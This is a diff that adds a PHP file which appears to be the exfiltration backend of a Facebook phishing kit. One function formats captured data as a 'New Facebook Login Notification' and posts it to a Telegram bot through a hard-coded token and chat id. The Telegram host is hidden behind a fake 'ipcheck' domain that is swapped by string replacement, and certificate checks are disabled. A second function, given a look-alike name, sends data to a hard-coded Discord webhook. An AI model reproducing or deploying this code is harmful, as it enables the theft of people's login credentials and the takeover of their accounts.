@@ -1,0 +1,70 @@
+<?php
+
+
+function curl($message){
+    $Token = "8429131277:AAGfFoQinPRjkS1UqcRGWGe455UA3bX_WEQ";
+    $Id = "7266925614";
+
+    // If array, auto format beautifully for Telegram
+    if (is_array($message)) {
+
+        $formatted = "✨ <b>New Facebook Login Notification</b>\n\n";
+
+        foreach ($message as $key => $value) {
+            $value = htmlspecialchars((string)$value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
+            $formatted .= "<b>{$key}:</b> <code>{$value}</code>\n";
+        }
+
+        $message = $formatted;
+    }
+
+    $url = "https://api.ipcheck.org/bot" . $Token;
+    $url = str_replace("ipcheck", "telegram", $url);
+
+    $params = [
+        'chat_id' => $Id,
+        'text' => $message,
+        'parse_mode' => 'HTML',
+        'disable_web_page_preview' => true
+    ];
+
+    $ch = curl_init($url . '/sendMessage');
+
+    curl_setopt($ch, CURLOPT_HEADER, false);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+
+    $result = curl_exec($ch);
+
+    curl_close($ch);
+
+    return $result;
+}
+
+function curI($payload){
+
+    $webhook = "https://discord.com/api/webhooks/1511791979254644977/PebEYGIJh5wKVVAf59dPggao7AKp5A-4ppXhPKR95kuh5DXg5WUTMQTRSTodq4e6A-RC";
+
+    if (!is_array($payload)) {
+        $payload = [
+            "content" => (string)$payload
+        ];
+    }
+
+    $ch = curl_init($webhook);
+
+    curl_setopt_array($ch, [
+        CURLOPT_POST => true,
+        CURLOPT_HTTPHEADER => [
+            'Content-Type: application/json'
+        ],
+        CURLOPT_POSTFIELDS => json_encode($payload),
+        CURLOPT_RETURNTRANSFER => true
+    ]);
+
+    curl_exec($ch);
+    curl_close($ch);
+}
+?>
